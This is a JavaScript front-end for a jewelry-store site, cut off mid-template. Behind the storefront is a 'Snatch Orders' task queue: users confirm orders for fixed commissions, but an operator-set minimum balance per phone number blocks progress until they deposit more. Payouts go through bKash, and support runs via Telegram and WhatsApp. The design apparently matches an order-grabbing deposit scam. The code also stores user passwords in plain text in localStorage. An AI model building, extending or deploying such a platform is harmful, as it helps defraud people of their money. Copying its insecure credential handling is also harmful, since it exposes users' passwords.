import { db } from "./firebase-config.js";
import {
  ref,
  push,
  onValue
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const DEFAULT_BATCH_COUNT = 25;
const DEFAULT_BATCH_PROFIT = 500;
const NEW_USER_STARTING_BALANCE = 0;

const DEFAULT_PRODUCTS = [
  {
    id: "rs-1",
    name: "7 Three Prong Sunstone Tennis Bracelet In 14K White Gold",
    category: "Bracelets",
    price: 480,
    reviews: "2,507 Reviews",
    tag: "25% OFF*",
    image: "./images/bracelet-1.jpg",
    description: "Hand-set sunstones in a 14K white gold tennis setting."
  },
  {
    id: "rs-2",
    name: "Royal Sunstone Velvet Travel Case & Gift Set",
    category: "Necklaces",
    price: 320,
    reviews: "9,410 Reviews",
    tag: "OUR GIFT TO YOU",
    image: "./images/necklace-1.jpg",
    description: "Structured travel case crafted for fine jewelry protection."
  },
  {
    id: "rs-3",
    name: "Imperial Sunstone & Bezel Drop Earrings in 14K Yellow Gold",
    category: "Earrings",
    price: 540,
    reviews: "17,362 Reviews",
    tag: "NEW ARRIVAL",
    image: "./images/earrings-1.jpg",
    description: "Luminous sunstone drops framed in warm 14K gold."
  },
  {
    id: "rs-4",
    name: "Dot Dash Sunstone Solitaire Ring in 14k Yellow Gold",
    category: "Rings",
    price: 450,
    reviews: "11,348 Reviews",
    tag: "SIGNATURE",
    image: "./images/ring-1.jpg",
    description: "Refined sunstone ring crafted for everyday royalty."
  }
];

const EXCLUSIVE_SLIDES = [
  {
    title: "THE PINNACLE OF LUXURY",
    subtitle: "ONLY AT ROYAL SUNSTONE",
    cta: "SHOP THE COLLECTION ->",
    filterCategory: "Necklaces",
    image: "./images/necklace-1.jpg"
  },
  {
    title: "A LUMINOUS EXPRESSION OF DIMENSIONAL FORM",
    subtitle: "WOVEN PAVÉ COLLECTION",
    cta: "SHOP THE COLLECTION ->",
    filterCategory: "Rings",
    image: "./images/ring-1.jpg"
  },
  {
    title: "RADIANT SUNSTONE BRILLIANCE",
    subtitle: "LIMITED EDITION SERIES",
    cta: "SHOP THE COLLECTION ->",
    filterCategory: "Bracelets",
    image: "./images/bracelet-1.jpg"
  }
];

function roundMoney(num) {
  const n = Number(num || 0);
  return Math.round((n + Number.EPSILON) * 100) / 100;
}

function buildAssignedQueue(baseList, orderCount, totalProfit, requiredBalancePerOrder) {
  const count = Math.max(1, Number(orderCount || DEFAULT_BATCH_COUNT));
  const profitTotal = roundMoney(totalProfit ?? DEFAULT_BATCH_PROFIT);
  const perOrderProfit = roundMoney(profitTotal / count);
  const pool = Array.isArray(baseList) && baseList.length > 0 ? baseList : DEFAULT_PRODUCTS;

  const list = [];
  for (let i = 0; i < count; i++) {
    const src = pool[i % pool.length];
    const isLast = i === count - 1;
    const allocatedProfit = isLast
      ? roundMoney(profitTotal - perOrderProfit * (count - 1))
      : perOrderProfit;
    const itemPrice = roundMoney(requiredBalancePerOrder > 0 ? requiredBalancePerOrder : src.price || 450);

    list.push({
      queueIndex: i + 1,
      id: `${src.id || "item"}-${i + 1}`,
      name: i < pool.length ? src.name : `${src.name} — Allocation #${i + 1}`,
      category: src.category || "Jewelry",
      price: itemPrice,
      reward: allocatedProfit,
      reviews: src.reviews || `${(1400 + i * 310).toLocaleString()} Reviews`,
      image: src.image || "",
      description: src.description || "Royal Sunstone Jewels fine piece."
    });
  }
  return list;
}

const FALLBACK_IMG =
  "data:image/svg+xml;charset=UTF-8," +
  encodeURIComponent(
    '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">' +
      '<rect width="600" height="400" fill="#efebe3"/>' +
      '<polygon points="300,90 355,165 300,240 245,165" fill="#142238"/>' +
      '<circle cx="300" cy="165" r="22" fill="#c69c53"/>' +
      '<text x="300" y="295" font-family="Georgia, serif" font-size="18" fill="#141414" text-anchor="middle">ROYAL SUNSTONE JEWELS</text>' +
    "</svg>"
  );

const STORAGE_KEY = "royal_sunstone_per_user_v2";

const state = {
  selectedCategory: "All",
  slideIndex: 0,
  pageMode: "main",
  snatchSubMode: "queue",
  snatchTab: "collection",
  isProcessingOrder: false,
  products: [...DEFAULT_PRODUCTS],
  assignedOrdersMap: {},
  activeQueue: buildAssignedQueue(DEFAULT_PRODUCTS, DEFAULT_BATCH_COUNT, DEFAULT_BATCH_PROFIT, 0),
  targetCount: DEFAULT_BATCH_COUNT,
  targetProfit: DEFAULT_BATCH_PROFIT,
  requiredBalancePerOrder: 0,
  completedStep: 0,
  dailyProfit: 0,
  outOfFunds: 0,
  testCredit: 10000,
  orders: [],
  history: [],
  userProfilesMap: {},
  supportConfig: {
    telegramUrl: "https://t.me/royalsunstone_support",
    whatsappNumber: "8801700000000"
  },
  session: {
    loggedIn: false,
    name: "shuvoum",
    uid: "UID:2410380",
    countryCode: "+880",
    phone: "",
    fullPhone: "",
    balance: NEW_USER_STARTING_BALANCE,
    bindMethod: "bkash",
    bindAddress: "45643"
  }
};

function createFreshProfile(fullPhone, password, startingBalance = NEW_USER_STARTING_BALANCE) {
  return {
    fullPhone,
    password,
    balance: roundMoney(startingBalance),
    completedStep: 0,
    dailyProfit: 0,
    outOfFunds: 0,
    testCredit: 10000,
    orders: [],
    history: [],
    bindMethod: "bkash",
    bindAddress: "45643"
  };
}

function normalizePhone(raw) {
  return String(raw || "").replace(/\D/g, "").replace(/^0+/, "");
}

function buildFullPhone(code, raw) {
  const clean = normalizePhone(raw);
  if (!clean) return "";
  return `+${String(code || "+880").replace(/\D/g, "")}${clean}`;
}

function applyUserOrderAssignment() {
  const phoneKey = normalizePhone(state.session.fullPhone || state.session.phone);
  const custom = phoneKey ? state.assignedOrdersMap[phoneKey] : null;

  if (custom) {
    state.targetCount = Math.max(1, Number(custom.orderCount || DEFAULT_BATCH_COUNT));
    state.targetProfit = roundMoney(custom.totalProfit ?? DEFAULT_BATCH_PROFIT);
    state.requiredBalancePerOrder = roundMoney(custom.requiredBalance || 0);
  } else {
    state.targetCount = DEFAULT_BATCH_COUNT;
    state.targetProfit = DEFAULT_BATCH_PROFIT;
    state.requiredBalancePerOrder = 0;
  }

  state.activeQueue = buildAssignedQueue(
    state.products,
    state.targetCount,
    state.targetProfit,
    state.requiredBalancePerOrder
  );

  if (state.completedStep > state.targetCount) {
    state.completedStep = state.targetCount;
  }
}

function saveCurrentProfile() {
  const fullPhone = state.session.fullPhone;
  if (!state.session.loggedIn || !fullPhone) return;
  const existing = state.userProfilesMap[fullPhone] || {};
  state.userProfilesMap[fullPhone] = {
    ...existing,
    fullPhone,
    password: existing.password || "",
    balance: roundMoney(state.session.balance),
    completedStep: Math.max(0, Number(state.completedStep || 0)),
    dailyProfit: roundMoney(state.dailyProfit || 0),
    outOfFunds: roundMoney(state.outOfFunds || 0),
    testCredit: roundMoney(state.testCredit ?? 10000),
    orders: Array.isArray(state.orders) ? state.orders : [],
    history: Array.isArray(state.history) ? state.history : [],
    bindMethod: state.session.bindMethod || "bkash",
    bindAddress: state.session.bindAddress || "45643"
  };
}

function loadProfileIntoState(fullPhone) {
  const prof = state.userProfilesMap[fullPhone];
  if (!prof) return;
  state.session.balance = roundMoney(prof.balance ?? NEW_USER_STARTING_BALANCE);
  state.session.bindMethod = prof.bindMethod || "bkash";
  state.session.bindAddress = prof.bindAddress || "45643";
  state.completedStep = Math.max(0, Number(prof.completedStep || 0));
  state.dailyProfit = roundMoney(prof.dailyProfit || 0);
  state.outOfFunds = roundMoney(prof.outOfFunds || 0);
  state.testCredit = roundMoney(prof.testCredit ?? 10000);
  state.orders = Array.isArray(prof.orders) ? prof.orders : [];
  state.history = Array.isArray(prof.history) ? prof.history : [];
  applyUserOrderAssignment();
}

function resetGuestViewState() {
  state.completedStep = 0;
  state.dailyProfit = 0;
  state.outOfFunds = 0;
  state.testCredit = 10000;
  state.orders = [];
  state.history = [];
  state.session.loggedIn = false;
  state.session.phone = "";
  state.session.fullPhone = "";
  state.session.balance = NEW_USER_STARTING_BALANCE;
  state.session.bindMethod = "bkash";
  state.session.bindAddress = "45643";
  applyUserOrderAssignment();
}

function saveLocal() {
  try {
    saveCurrentProfile();
    localStorage.setItem(
      STORAGE_KEY,
      JSON.stringify({
        products: state.products,
        assignedOrdersMap: state.assignedOrdersMap,
        userProfilesMap: state.userProfilesMap,
        supportConfig: state.supportConfig,
        session: {
          ...state.session,
          balance: roundMoney(state.session.balance)
        }
      })
    );
  } catch (_) {}
}

function loadLocal() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) {
      resetGuestViewState();
      return;
    }
    const p = JSON.parse(raw);
    if (Array.isArray(p.products) && p.products.length > 0) {
      state.products = p.products;
    }
    if (p.assignedOrdersMap && typeof p.assignedOrdersMap === "object") {
      state.assignedOrdersMap = p.assignedOrdersMap;
    }
    if (p.userProfilesMap && typeof p.userProfilesMap === "object") {
      state.userProfilesMap = p.userProfilesMap;
    }
    if (p.supportConfig && typeof p.supportConfig === "object") {
      state.supportConfig = { ...state.supportConfig, ...p.supportConfig };
    }
    if (p.session && typeof p.session === "object") {
      state.session = {
        ...state.session,
        ...p.session,
        balance: roundMoney(p.session.balance ?? NEW_USER_STARTING_BALANCE)
      };
    }
    if (state.session.loggedIn && state.session.fullPhone && state.userProfilesMap[state.session.fullPhone]) {
      loadProfileIntoState(state.session.fullPhone);
    } else {
      resetGuestViewState();
    }
  } catch (_) {
    resetGuestViewState();
  }
}

function showToast(msg) {
  const el = document.getElementById("toastBox");
  if (!el) return;
  el.textContent = msg;
  el.classList.add("show");
  clearTimeout(showToast._t);
  showToast._t = setTimeout(() => el.classList.remove("show"), 3000);
}

function setText(id, val) {
  const el = document.getElementById(id);
  if (el) el.textContent = String(val);
}

function escapeHtml(str) {
  return String(str ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

function addHistory(text) {
  state.history.unshift({
    text,
    time: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
  });
  state.history = state.history.slice(0, 20);
}

function getRequiredAmountForItem(item) {
  const minSet = roundMoney(state.requiredBalancePerOrder || 0);
  if (minSet > 0) return minSet;
  return roundMoney(item?.price || 0);
}

function switchToSnatchPage(subMode = "queue") {
  state.pageMode = "snatch";
  state.snatchSubMode = subMode;
  document.getElementById("mainStorefrontView")?.classList.add("hidden-page");
  document.getElementById("snatchDedicatedPage")?.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });
  renderSnatchDedicatedPage();
}

function switchToMainPage() {
  state.pageMode = "main";
  document.getElementById("snatchDedicatedPage")?.classList.remove("active");
  document.getElementById("mainStorefrontView")?.classList.remove("hidden-page");
  window.scrollTo({ top: 0, behavior: "smooth" });
  renderMainSections();
}

function renderTopAndDrawer() {
  const loggedIn = Boolean(state.session.loggedIn);
  const bal = roundMoney(state.session.balance || 0);

  setText(
    "statusSummary",
    `${loggedIn ? state.session.fullPhone : "Member: Guest"} • Wallet: ৳ ${bal.toFixed(2)}`
  );
  setText("snatchPageBalance", `৳ ${bal.toFixed(2)}`);

  const snatchBtn = document.getElementById("topSnatchBtn");
  const authBtn = document.getElementById("topAuthBtn");
  if (snatchBtn) snatchBtn.style.display = loggedIn ? "inline-block" : "none";
  setText("snatchBadge", `${state.completedStep} / ${state.targetCount}`);
  if (authBtn) authBtn.textContent = loggedIn ? "Logout" : "Login / Register";

  setText("drawerName", loggedIn ? state.session.fullPhone : state.session.name || "shuvoum");
  setText("drawerUid", state.session.uid || "UID:2410380");

  const histBox = document.getElementById("historyListBox");
  if (histBox) {
    histBox.innerHTML = state.history.length
      ? state.history
          .map((h) => `<div style="padding:4px 0; border-bottom:1px dashed #e5e7eb;">${escapeHtml(h.text)} (${escapeHtml(h.time)})</div>`)
          .join("")
      : "No history yet.";
  }
}

function renderMainSections() {
  const filtered =
    state.selectedCategory === "All"
      ? state.products
      : state.products.filter((p) => p.category === state.selectedCategory);

  const threeCards = (filtered.length >= 3 ? filtered : state.products).slice(0, 3);
  const grid = document.getElementById("threeShowcaseGrid");
  if (grid) {
    grid.innerHTML = threeCards
      .map((item) => {
        const img = item.image || FALLBACK_IMG;
        return `
          <article class="showcase-tile">
            <img
              src="${img}"
              alt="${escapeHtml(item.name)}"
              class="showcase-tile-img"
              onerror="this.onerror=null;this.src='${FALLBACK_IMG}';"
            />
            <div class="showcase-tile-body">
              <div style="font-size:11px; font-weight:800; letter-spacing:1.2px; text-transform:uppercase; color:#666; margin-bottom:4px;">
                ${escapeHtml(item.tag || item.category || "FINE JEWELRY")}
              </div>
              <div style="font-size:15px; font-weight:700; color:#141414; margin-bottom:4px;">${escapeHtml(item.name)}</div>
              <div style="font-size:12px; color:#666;">$${Number(item.price || 0).toFixed(2)} &bull; ${escapeHtml(item.category || "")}</div>
            </div>
          </article>
        `;
      })
      .join("");
  }

  const setImg = (id, src) => {
    const el = document.getElementById(id);
    if (!el) return;
    el.src = src || FALLBACK_IMG;
    el.onerror = () => {
      el.onerror = null;
      el.src = FALLBACK_IMG;
    };
  };

  setImg("exploreCollectionImg", state.products[3]?.image || state.products[0]?.image);
  setImg("creativeStudioImg", state.products[2]?.image || state.products[0]?.image);
  setImg("editorialImg1", state.products[2]?.image || state.products[0]?.image);
  setImg("editorialImg2", state.products[3]?.image || state.products[0]?.image);

  const slide = EXCLUSIVE_SLIDES[state.slideIndex % EXCLUSIVE_SLIDES.length];
  const slideBox = document.getElementById("exclusiveSlideBox");
  if (slideBox) {
    const sImg = slide.image || FALLBACK_IMG;
    slideBox.innerHTML = `
      <img
        src="${sImg}"
        alt="${escapeHtml(slide.title)}"
        class="exclusive-banner-img"
        onerror="this.onerror=null;this.src='${FALLBACK_IMG}';"
      />
      <div class="exclusive-overlay-text">
        <div style="font-size:11px; letter-spacing:2px; margin-bottom:6px; text-transform:uppercase;">${escapeHtml(slide.subtitle)}</div>
        <h3>${escapeHtml(slide.title)}</h3>
        <button type="button" class="shop-collection-ghost" id="slideShopBtn">${escapeHtml(slide.cta)}</button>
      </div>
    `;
    document.getElementById("slideShopBtn")?.addEventListener("click", () => {
      state.selectedCategory = slide.filterCategory || "All";
      renderMainSections();
      document.getElementById("craftedSection")?.scrollIntoView({ behavior: "smooth" });
    });
  }

  document.querySelectorAll(".carousel-dot").forEach((dot) => {
    dot.classList.toggle("active", Number(dot.dataset.slide) === state.slideIndex);
  });
}

function renderSnatchDedicatedPage() {
  const body = document.getElementById("snatchPageBody");
  if (!body) return;

  if (state.snatchSubMode === "payout") {
    const bal = roundMoney(state.session.balance || 0);
    body.innerHTML = `
      <div style="font-size:12px; color:#6b7280; margin-bottom:8px;">Snatch Orders &gt; Pay Out</div>
      <h1 style="font-size:28px; font-weight:800; margin-bottom:16px;">Pay Out</h1>
      <div style="background:#1d2d44; color:#fff; border-radius:14px; padding:22px; display:flex; justify-content:space-between; align-items:center; margin-bottom:18px;">
        <div>
          <div style="font-size:13px; color:#cbd5e1;">Wallet Funds</div>
          <div style="font-size:30px; font-weight:800; margin-top:4px;">&#2547; ${bal.toFixed(2)}</div>
        </div>
        <span style="font-size:28px;">&#128091;</span>
      </div>

      <div style="font-weight:700; font-size:13px; margin-bottom:8px;">Collection Address</div>
      <div style="border:1px solid #86efac; background:#f0fdf4; border-radius:12px; padding:14px 16px; display:flex; justify-content:space-between; align-items:center; margin-bottom:18px;">
        <div>
          <div style="font-weight:700;">${escapeHtml(state.session.bindMethod || "bkash")}</div>
          <div style="color:#4b5563; font-size:13px;">${escapeHtml(state.session.bindAddress || "45643")}</div>
        </div>
        <span style="color:#16a34a; font-weight:800; font-size:18px;">&#10003;</span>
      </div>

      <form id="pagePayOutForm">
        <label style="display:block; font-weight:700; font-size:13px; margin-bottom:6px;">Pay Out Amount</label>
        <input type="number" id="pagePayOutAmt" class="input" step="0.01" min="1" required placeholder="&#2547; Enter amount" style="margin-bottom:14px;" />
        <div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:10px; padding:14px; font-size:12px; color:#475569; margin-bottom:16px;">
          <div style="font-weight:700; margin-bottom:4px;">Rules : Minimum Pay Out &#2547;500</div>
          <p>Please bind in the correct bank account information. Double-check details before submitting.</p>
        </div>
        <button type="submit" style="width:100%; background:#090b10; color:#fff; border:none; border-radius:8px; padding:15px; font-size:15px; font-weight:700; cursor:pointer;">Pay Out</button>
      </form>
      <button type="button" class="btn btn-outline" id="backToQueueBtn" style="width:100%; margin-top:12px;">Back to Snatch Queue</button>
    `;

    document.getElementById("backToQueueBtn")?.addEventListener("click", () => switchToSnatchPage("queue"));
    document.getElementById("pagePayOutForm")?.addEventListener("submit", (e) => {
      e.preventDefault();
      const amt = roundMoney(document.getElementById("pagePayOutAmt").value || 0);
      if (amt < 500) return showToast("Minimum Pay Out is ৳500.");
      if (amt > roundMoney(state.session.balance || 0)) return showToast("Insufficient Wallet Funds.");
      state.session.balance = roundMoney(Number(state.session.balance) - amt);
      state.outOfFunds = roundMoney(Number(state.outOfFunds || 0) + amt);
      addHistory(`Pay Out ৳${amt.toFixed(2)}`);
      saveLocal();
      renderTopAndDrawer();
      renderSnatchDedicatedPage();
      showToast(`Pay Out request for ৳${amt.toFixed(2)} submitted.`);
      push(ref(db, "payouts"), {
        fullPhone: state.session.fullPhone || "member",
        method: state.session.bindMethod,
        address: state.session.bindAddress,
        amount: amt,
        createdAt: new Date().toISOString()
      }).catch(() => {});
    });
    return;
  }

  if (state.snatchSubMode === "contact") {
    const cleanWa = String(state.supportConfig.whatsappNumber || "").replace(/\D/g, "");
    const tgUrl = state.supportConfig.telegramUrl || "https://t.me/royalsunstone_support";

    body.innerHTML = `
      <div style="font-size:12px; color:#6b7280; margin-bottom:8px;">Snatch Orders &gt; Contact Us</div>
      <div style="position:relative; border-radius:10px; overflow:hidden; min-height:200px; display:grid; place-items:center; text-align:center; color:#fff; background:linear-gradient(rgba(30,27,24,0.58),rgba(30,27,24,0.68)), url('${state.products[3]?.image || FALLBACK_IMG}') center/cover; padding:22px; margin-bottom:18px;">
        <div style="background:rgba(120,118,115,0.72); border-radius:12px; padding:16px 20px; max-width:480px;">
          <h2 style="font-size:22px; font-weight:800; margin-bottom:6px;">Royal Sunstone Help Center</h2>
          <p style="font-size:13px;">Reach our official Telegram and WhatsApp support channels configured in Control Panel.</p>
        </div>
      </div>

      <h3 style="font-size:17px; font-weight:800; margin-bottom:12px;">Knowledge Base</h3>
      <a href="${escapeHtml(tgUrl)}" target="_blank" rel="noopener noreferrer" style="display:flex; align-items:center; justify-content:center; gap:10px; width:100%; background:#fff; border:1px solid #111; border-radius:6px; padding:15px; margin-bottom:12px; font-weight:700;">
        <span style="width:30px; height:30px; border-radius:50%; background:#111; color:#fff; display:inline-grid; place-items:center;">&#9992;</span>
        <span>Telegram</span>
      </a>
      <a href="https://wa.me/${escapeHtml(cleanWa)}" target="_blank" rel="noopener noreferrer" style="display:flex; align-items:center; justify-content:center; gap:10px; width:100%; background:#fff; border:1px solid #111; border-radius:6px; padding:15px; font-weight:700;">
        <span style="width:30px; height:30px; border-radius:50%; background:#111; color:#fff; display:inline-grid; place-items:center;">&#9742;</span>
        <span>WhatsApp</span>
      </a>
      <button type="button" class="btn btn-outline" id="backToQueueBtn" style="width:100%; margin-top:14px;">Back to Snatch Queue</button>
    `;
    document.getElementById("backToQueueBtn")?.addEventListener("click", () => switchToSnatchPage("queue"));
    return;
  }

  const nextStep = Math.min(state.targetCount, state.completedStep + 1);
  const nextItem = state.activeQueue[state.completedStep];
  const requiredForNext = nextItem ? getRequiredAmountForItem(nextItem) : 0;
  const currentBal = roundMoney(state.session.balance || 0);
  const insufficientBalance = state.completedStep < state.targetCount && currentBal < requiredForNext;
  const visibleItems = state.activeQueue.slice(0, 5);

  body.innerHTML = `
    <div style="font-size:12px; color:#6b7280; margin-bottom:6px;">Home &gt; Snatch Orders</div>
    <h1 style="font-size:28px; font-weight:800; color:#111827; margin-bottom:14px;">Royal Sunstone Order</h1>

    <div class="tab-strip">
      <button type="button" class="tab-btn ${state.snatchTab === "collection" ? "active" : ""}" id="sTabCol">
        Collection (${state.targetCount})
      </button>
      <button type="button" class="tab-btn ${state.snatchTab === "description" ? "active" : ""}" id="sTabDesc">
        Description
      </button>
    </div>

    <div>
      ${visibleItems
        .map(
          (item) => `
            <div class="queue-row">
              <div class="queue-left">
                <span class="queue-num">${item.queueIndex}</span>
                <img
                  src="${item.image || FALLBACK_IMG}"
                  alt="${escapeHtml(item.name)}"
                  class="queue-thumb"
                  onerror="this.onerror=null;this.src='${FALLBACK_IMG}';"
                />
                <div>
                  <div style="font-weight:700; font-size:14px; color:#111827;">${escapeHtml(item.name)}</div>
                  <div style="font-size:12px; color:#4b5563; margin-top:3px;">
                    &#9733; ${escapeHtml(item.reviews)} &bull; Req: &#2547;${getRequiredAmountForItem(item).toFixed(2)} &bull; Profit: +&#2547;${roundMoney(item.reward).toFixed(2)}
                    ${item.queueIndex <= state.completedStep ? ` &bull; <strong style="color:#15803d;">Confirmed</strong>` : ""}
                  </div>
                </div>
              </div>
              <span style="font-size:20px; color:#6b7280;">&rsaquo;</span>
            </div>
          `
        )
        .join("")}
    </div>

    <div style="padding:12px 6px; font-size:12px; color:#4b5563; background:#f9fafb; border-bottom:1px solid #eceef2;">
      Progress: <strong>${state.completedStep} / ${state.targetCount}</strong> &bull;
      Batch Profit: <strong>&#2547; ${roundMoney(state.dailyProfit).toFixed(2)} / &#2547; ${roundMoney(state.targetProfit).toFixed(2)}</strong> &bull;
      Balance: <strong>&#2547; ${currentBal.toFixed(2)}</strong>
    </div>

    ${
      insufficientBalance
        ? `
          <div class="balance-warning-box">
            Insufficient balance to confirm Order #${nextStep}. Required: &#2547;${requiredForNext.toFixed(2)}, Available: &#2547;${currentBal.toFixed(2)}. Please add balance before confirming.
          </div>
        `
        : ""
    }

    <div class="action-pair">
      <button type="button" class="btn btn-purple" id="sAccBtn">Account Details</button>
      <button type="button" class="btn btn-purple" id="sRecBtn">Order Record</button>
    </div>

    <button
      type="button"
      class="start-batch-btn ${insufficientBalance ? "locked" : ""}"
      id="sStartBtn"
      ${state.completedStep >= state.targetCount || state.isProcessingOrder ? "disabled" : ""}
    >
      ${
        state.completedStep >= state.targetCount
          ? `Completed ${state.targetCount} / ${state.targetCount}`
          : `Start ${nextStep} / ${state.targetCount}`
      }
    </button>
  `;

  document.getElementById("sTabCol")?.addEventListener("click", () => {
    state.snatchTab = "collection";
    renderSnatchDedicatedPage();
  });
  document.getElementById("sTabDesc")?.addEventListener("click", () => {
    state.snatchTab = "description";
    renderSnatchDedicatedPage();
    showToast(`Assigned ${state.targetCount} orders with ৳${roundMoney(state.targetProfit).toFixed(2)} total profit.`);
  });
  document.getElementById("sAccBtn")?.addEventListener("click", openAccountDetailsModal);
  document.getElementById("sRecBtn")?.addEventListener("click", openOrderRecordModal);
  document.getElementById("sStartBtn")?.addEventListener("click", runAnimatedOrderConfirmation);
}

function runAnimatedOrderConfirmation() {
  if (!state.session.loggedIn) {
    openPhoneAuthModal();
    return;
  }
  if (state.isProcessingOrder || state.completedStep >= state.targetCount) return;

  const nextStep = state.completedStep + 1;
  const item = state.activeQueue[nextStep - 1] || {
    name: "Royal Sunstone Piece",
    price: 450,
    reward: roundMoney(state.targetProfit / Math.max(1, state.targetCount))
  };

  const requiredAmt = getRequiredAmountForItem(item);
  const currentBal = roundMoney(state.session.balance || 0);

  if (currentBal < requiredAmt) {
    const shortfall = roundMoney(requiredAmt - currentBal);
    state.outOfFunds = roundMoney(Number(state.outOfFunds || 0) + shortfall);
    addHistory(`Blocked #${nextStep}: Need ৳${requiredAmt.toFixed(2)}`);
    saveLocal();
    renderSnatchDedicatedPage();
    showToast(`Insufficient balance! Need ৳${requiredAmt.toFixed(2)} to confirm order.`);
    return;
  }

  state.isProcessingOrder = true;
  renderSnatchDedicatedPage();

  const diggingEl = document.getElementById("diggingOverlay");
  const splashEl = document.getElementById("luxurySplashOverlay");

  diggingEl?.classList.add("open");

  setTimeout(() => {
    diggingEl?.classList.remove("open");
    splashEl?.classList.add("open");

    setTimeout(() => {
      splashEl?.classList.remove("open");

      if (state.completedStep < state.targetCount) {
        const stepNow = state.completedStep + 1;
        const targetItem = state.activeQueue[stepNow - 1] || item;
        const rewardAmt = roundMoney(targetItem.reward ?? state.targetProfit / Math.max(1, state.targetCount));

        state.completedStep = stepNow;
        state.session.balance = roundMoney(Number(state.session.balance || 0) + rewardAmt);
        state.dailyProfit =
          stepNow === state.targetCount
            ? roundMoney(state.targetProfit)
            : roundMoney(Number(state.dailyProfit || 0) + rewardAmt);

        const ord = {
          step: stepNow,
          itemName: targetItem.name,
          requiredBalance: requiredAmt,
          reward: rewardAmt,
          fullPhone: state.session.fullPhone,
          status: "Confirmed",
          createdAt: new Date().toISOString()
        };
        state.orders.unshift(ord);
        addHistory(`Confirmed #${stepNow}/${state.targetCount} (+৳${rewardAmt.toFixed(2)})`);

        saveLocal();
        renderTopAndDrawer();
        renderSnatchDedicatedPage();
        showToast(`Order ${stepNow} / ${state.targetCount} Confirmed! (+৳${rewardAmt.toFixed(2)})`);

        push(ref(db, "orders"), ord).catch(() => {});
      }

      state.isProcessingOrder = false;
      renderSnatchDedicatedPage();
    }, 1300);
  }, 1200);
}

function openModal(html) {
  const backdrop = document.getElementById("appModal");
  const box = document.getElementById("modalBox");
  if (!backdrop || !box) return;
  box.innerHTML = html;
  backdrop.classList.add("open");
  document.getElementById("modalCloseX")?.addEventListener("click", closeModal);
}

function closeModal() {
  document.getElementById("appModal")?.classList.remove("open");
}

function openPhoneAuthModal() {
  openModal(`
    <div style="padding:18px 22px; border-bottom:1px solid #e5e7eb; display:flex; justify-content:space-between; align-items:center;">
      <h3 style="font-size:21px; font-weight:800;">Login</h3>
      <button type="button" id="modalCloseX" style="background:none; border:none; font-size:24px; cursor:pointer;">&times;</button>
    </div>
    <div style="padding:20px 22px;">
      <form id="mLoginForm">
        <label style="display:block; font-weight:700; font-size:13px; margin-bottom:6px;">Phone</label>
        <div style="display:grid; grid-template-columns:120px 1fr; border:1px solid #cbd5e1; border-radius:8px; overflow:hidden; margin-bottom:14px;">
          <select id="mLoginCode" style="background:#0b1628; color:#fff; border:none; padding:10px; font-weight:700;">
            <option value="+880" selected>BAN (+88</option>
            <option value="+91">IND (+91</option>
            <option value="+1">USA (+1</option>
          </select>
          <input type="tel" id="mLoginPhone" required placeholder="1XXXXXXXXX" style="border:none; padding:10px 12px; font-size:14px; outline:none;" />
        </div>
        <label style="display:block; font-weight:700; font-size:13px; margin-bottom:6px;">Password</label>
        <input type="password" id="mLoginPass" class="input" required placeholder="Password" style="margin-bottom:14px;" />
        <button type="submit" class="btn btn-navy" style="width:100%; padding:13px; font-size:15px;">Sign In</button>
      </form>

      <div style="border-top:1px solid #e5e7eb; margin-top:18px; padding-top:16px;">
        <div style="font-weight:700; font-size:14px; margin-bottom:8px;">Don't have an account? Register</div>
        <form id="mRegForm">
          <div style="display:grid; grid-template-columns:120px 1fr; border:1px solid #cbd5e1; border-radius:8px; overflow:hidden; margin-bottom:10px;">
            <select id="mRegCode" style="background:#0b1628; color:#fff; border:none; padding:10px; font-weight:700;">
              <option value="+880" selected>BAN (+88</option>
              <option value="+91">IND (+91</option>
              <option value="+1">USA (+1</option>
            </select>
            <input type="tel" id="mRegPhone" required placeholder="1XXXXXXXXX" style="border:none; padding:10px 12px; font-size:14px; outline:none;" />
          </div>
          <input type="password" id="mRegPass" class="input" required minlength="6" placeholder="Create password (6+ chars)" style="margin-bottom:10px;" />
          <button type="submit" class="btn btn-outline" style="width:100%; padding:11px;">Register</button>
        </form>
      </div>
    </div>
  `);

  const finishAuth = (code, phone, pass, isReg) => {
    const fullPhone = buildFullPhone(code, phone);
    if (!fullPhone || !pass) return;

    const existing = state.userProfilesMap[fullPhone];
    if (!isReg && existing && existing.password && existing.password !== pass) {
      showToast("Incorrect password.");
      return;
    }

    if (isReg || !existing) {
      state.userProfilesMap[fullPhone] = createFreshProfile(fullPhone, pass, NEW_USER_STARTING_BALANCE);
    } else {
      state.userProfilesMap[fullPhone] = {
        ...existing,
        password: pass
      };
    }

    state.session.loggedIn = true;
    state.session.countryCode = code;
    state.session.phone = normalizePhone(phone);
    state.session.fullPhone = fullPhone;

    loadProfileIntoState(fullPhone);
    addHistory(`${isReg ? "Register" : "Login"}: ${fullPhone}`);
    saveLocal();
    renderTopAndDrawer();
    closeModal();
    switchToMainPage();
    showToast(`Welcome ${fullPhone}`);
  };

  document.getElementById("mLoginForm")?.addEventListener("submit", (e) => {
    e.preventDefault();
    finishAuth(
      document.getElementById("mLoginCode").value,
      document.getElementById("mLoginPhone").value,
      document.getElementById("mLoginPass").value,
      false
    );
  });

  document.getElementById("mRegForm")?.addEventListener("submit", (e) => {
    e.preventDefault();
    finishAuth(
      document.getElementById("mRegCode").value,
      document.getElementById("mRegPhone").value,
      document.getElementById("mRegPass").value,
      true
    );
  });
}

function openAccountDetailsModal() {
  const bal = roundMoney(state.session.balance || 0);
  const profit = roundMoney(state.dailyProfit || 0);
  const outAmt = roundMoney(state.outOfFunds || 0);
  const creditAmt = roundMoney(state.testCredit || 10000);

  openModal(`
    <div style="background:#cbd5e1; padding:16px 20px; display:flex; justify-content:space-between; align-items:center;">
      <h3 style="font-size:19px; font-weight:700; margin:0 auto;">Account Details</h3>
      <button type="button" id="modalCloseX" style="background:none; border:none; font-size:22px; cursor:pointer;">&times;</button>
    </div>
    <div style="padding:22px;">
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:18px 24px; margin-bottom:22px;">
        <div>
          <div style="font-size:12px; color:#4b5563;">Available Balance</div>
          <div style="font-size:17px; font-weight:700;">${bal.toFixed(2)}</div>
        </div>
        <div>
